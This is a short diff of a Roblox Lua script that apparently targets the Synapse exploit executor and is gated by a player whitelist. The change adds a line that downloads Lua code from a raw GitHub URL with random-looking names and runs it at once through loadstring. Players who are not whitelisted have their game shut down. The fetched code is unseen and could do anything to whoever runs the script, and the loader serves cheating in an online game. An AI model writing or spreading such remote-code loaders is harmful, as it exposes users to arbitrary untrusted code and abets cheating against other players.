@@ -6,7 +6,7 @@ whitelist = {
 if syn then
     if whitelist[game.Players.LocalPlayer.Name] then
         if not game.CoreGui["Project Anti Abusers"] then
-            loadstring(game:HttpGetAsync(''))()
+            loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/asdiasjiodasj/uihfasdiash/main/asdsdfgdfdfgdfgfasd.lua'))()
         else end
     else game:Shutdown()
     end
